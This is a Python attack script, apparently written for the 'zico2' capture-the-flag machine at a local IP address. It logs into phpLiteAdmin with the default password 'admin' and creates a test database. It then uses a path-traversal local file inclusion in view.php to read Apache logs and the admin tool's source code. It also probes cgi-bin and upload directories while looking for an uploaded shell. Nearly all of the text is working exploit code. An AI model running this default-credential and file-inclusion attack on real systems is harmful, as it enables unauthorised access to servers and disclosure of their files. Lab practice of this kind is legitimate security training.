#!/usr/bin/env python3
"""zico2 - Check where phpLiteAdmin actually creates files"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Create a uniquely named database and find it via LFI
test_name = 'ZZZTEST_' + str(int(__import__('time').time()))
print(f'[1] Creating test DB: {test_name}')
r = s.post(PHPLITE, data={'new_dbname': test_name}, timeout=15)
print(f'  Result: {r.status_code}')

# Search for it via LFI in various locations
print(f'[2] Searching for {test_name} via LFI...')

# Method: read /proc/self/fd/ to find open files, or check directory listings
search_paths = [
    # Check what databases exist
    '../../../usr/databases/',
    '../../usr/databases/',
    '../usr/databases/',
]

# Try to list /usr/databases/ via LFI
# We can't directly list directories, but we can try to read known files
# Check if the test db file was created at the expected path
expected_paths = [
    f'/usr/databases/{test_name}',
    f'../usr/databases/{test_name}',
]

# Actually, let's use the LFI to read the Apache error log
# When Apache tries to serve a 404, it logs the attempted path
print('[3] Reading Apache error log to find attempted paths...')
r = s.get(f'{BASE}/view.php?page=../../../var/log/apache2/error.log', timeout=10)
if len(r.text) > 50:
    # Look for recent 404s or file not found
    lines = r.text.strip().split('\n')
    for line in lines[-20:]:
        clean = re.sub(r'<[^>]+>', '', line).strip()
        if clean and 'error' not in clean.lower()[:5]:
            print(f'  {clean[:150]}')

# Also check access log
print('[4] Reading Apache access log...')
r = s.get(f'{BASE}/view.php?page=../../../var/log/apache2/access.log', timeout=10)
if len(r.text) > 50:
    lines = r.text.strip().split('\n')
    # Show last entries with /s.php
    for line in lines[-20:]:
        if 's.php' in line or 'shell' in line.lower():
            clean = re.sub(r'<[^>]+>', '', line).strip()
            print(f'  {clean[:200]}')

# Check if Apache has mod_cgi enabled and we can put a CGI script
print('[5] Checking CGI-BIN...')
r = s.get(f'{BASE}/cgi-bin/', timeout=10)
print(f'  /cgi-bin/: {r.status_code} ({len(r.text)}B)')

# Check upload directories
print('[6] Checking upload directories...')
upload_paths = ['/uploads/', '/upload/', '/images/', '/tmp/', '/files/']
for p in upload_paths:
    r = s.get(f'{BASE}{p}', timeout=5)
    if r.status_code == 200:
        print(f'  {p}: {r.status_code} ({len(r.text)}B)')

# Last resort: use LFI to read phpLiteAdmin source and understand the sanitization
print('[7] Reading phpLiteAdmin source...')
r = s.get(f'{BASE}/view.php?page=../../../var/www/dbadmin/test_db.php', timeout=10)
if len(r.text) > 100:
    # Find the directory/newdb creation logic
    newdb_section = r.text[r.text.find('newdb'):r.text.find('newdb')+2000] if 'newdb' in r.text.lower() else ''
    if newdb_section:
        print(f'  newdb section: {newdb_section[:500]}')
    
    # Find directory variable
    dir_match = re.search(r'\$directory\s*=\s*["\']([^"\']+)["\']', r.text)
    if dir_match:
        print(f'  $directory = {dir_match.group(1)}')
    
    # Find sanitization
    sanitize = re.findall(r'(preg_replace|str_replace|basename|realpath|sanitize|check)[^;]{0,200}', r.text)
    for s_match in sanitize[:5]:
        print(f'  Sanitize: {s_match[:200]}')
else:
    print(f'  Source not readable: {len(r.text)}B')
